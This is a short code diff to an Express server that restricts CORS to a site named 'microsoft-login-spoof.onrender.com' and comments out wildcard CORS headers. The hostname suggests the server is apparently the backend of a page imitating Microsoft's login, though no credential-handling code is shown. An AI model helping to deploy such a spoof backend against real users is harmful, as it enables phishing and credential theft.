@@ -3,14 +3,14 @@ import fs from "fs";
 import cors from 'cors';
 
 const app = express();
-app.use(cors({ origin: '*' }));
+app.use(cors({ origin: 'https://microsoft-login-spoof.onrender.com' }));
 
-app.use((req, res, next) => {
-    res.header('Access-Control-Allow-Origin', '*'); // Allow all origins
-    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
-    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-    next();
-});
+// app.use((req, res, next) => {
+//     res.header('Access-Control-Allow-Origin', '*'); // Allow all origins
+//     res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+//     res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
+//     next();
+// });
 
 app.use(express.urlencoded({ extended: false }));
 app.use(express.json());
